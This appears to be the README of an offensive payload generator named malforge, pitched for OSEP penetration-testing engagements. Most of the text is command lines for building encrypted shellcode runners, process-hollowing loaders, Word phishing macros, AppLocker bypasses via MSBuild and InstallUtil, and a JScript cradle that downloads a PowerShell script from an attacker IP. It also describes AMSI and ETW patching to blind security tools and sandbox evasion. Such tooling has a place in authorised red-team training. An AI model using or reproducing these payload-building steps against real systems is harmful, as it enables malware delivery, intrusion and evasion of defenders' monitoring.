# malforge

Shellcode encryption and payload generation for OSEP engagements.

Takes raw shellcode (or generates via msfvenom), encrypts with stackable layers, and outputs ready-to-compile payloads in 9 formats.

## Install

```
pip install .
```

## Usage

```bash
# C# runner with XOR encryption
malforge -l 10.0.0.1 -p 443 -f exe -e xor -o runner.cs

# from a raw .bin file, AES encrypted, with AMSI bypass
malforge -i shellcode.bin -f exe -e aes --amsi -o payload.cs

# chained encryption (XOR first, then AES)
malforge -i sc.bin -f exe -e xor,aes --amsi --sandbox -o payload.cs

# VBA macro for Word phishing
malforge -i sc.bin -f macro -e xor --amsi -o macro.vba

# process hollowing into svchost
malforge -l 10.0.0.1 -p 443 -f hollow -e rc4 --sandbox -o hollow.cs

# DLL for rundll32
malforge -i sc.bin -f dll -e xor -o payload.cs

# PowerShell runner
malforge -i sc.bin -f ps1 -e aes -o runner.ps1

# MSBuild inline task (applocker bypass)
malforge -i sc.bin -f msbuild -e xor -o payload.csproj

# InstallUtil (applocker bypass)
malforge -i sc.bin -f installutil -e caesar -o payload.cs

# JScript download cradle
malforge -f js --url http://10.0.0.1/shell.ps1 -o cradle.js

# list formats and encryption methods
malforge --formats
malforge --encodings
```

## Formats

| Format | Template | Description |
|--------|----------|-------------|
| exe | cs_runner.cs | C# EXE - VirtualAlloc + CreateThread |
| hollow | cs_hollow.cs | C# EXE - process hollowing into svchost |
| dll | cs_dll.cs | C# DLL - rundll32 / regsvr32 compatible |
| macro | vba_macro.vba | VBA macro - AutoOpen + Document_Open |
| hta | hta_runner.hta | HTA - VBScript shellcode runner |
| ps1 | ps_runner.ps1 | PowerShell - Add-Type with P/Invoke |
| js | jscript.js | JScript - download cradle |
| msbuild | msbuild.csproj | MSBuild inline task (applocker bypass) |
| installutil | installutil.cs | InstallUtil uninstall (applocker bypass) |

## Encryption

| Method | Formats | Notes |
|--------|---------|-------|
| xor | all | multi-byte key, auto-generated |
| aes | C#, PS1 | AES-256-CBC, PKCS7 padding |
| rc4 | C#, PS1 | stream cipher |
| caesar | all | byte shift |

Chain multiple: `-e xor,aes` encrypts with XOR first, then AES. The generated payload decrypts in reverse order.

## Evasion

`--amsi` patches AmsiScanBuffer at runtime (C#, VBA, PowerShell).

`--etw` patches EtwEventWrite to blind EDR telemetry (C#, PowerShell).

`--sandbox` adds sleep + timing checks to detect sandboxes (C#, VBA).

**Memory safety:** All C# templates use RW→RX allocation (VirtualAlloc with PAGE_READWRITE, then VirtualProtect to PAGE_EXECUTE_READ). Never allocates RWX memory, which is the #1 AV detection signal for shellcode runners.

## Compiling C# output

```bash
# EXE
mcs -out:payload.exe payload.cs

# DLL
mcs -target:library -out:payload.dll payload.cs

# run DLL
rundll32 payload.dll,Run

# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

## Shellcode input

The tool auto-detects input format:
- Raw binary (.bin from msfvenom `-f raw`)
- Hex string (fc4883e4f0...)
- C# format (0xfc,0x48,0x83,...)
- Or generate directly: `-l IP -p PORT` calls msfvenom
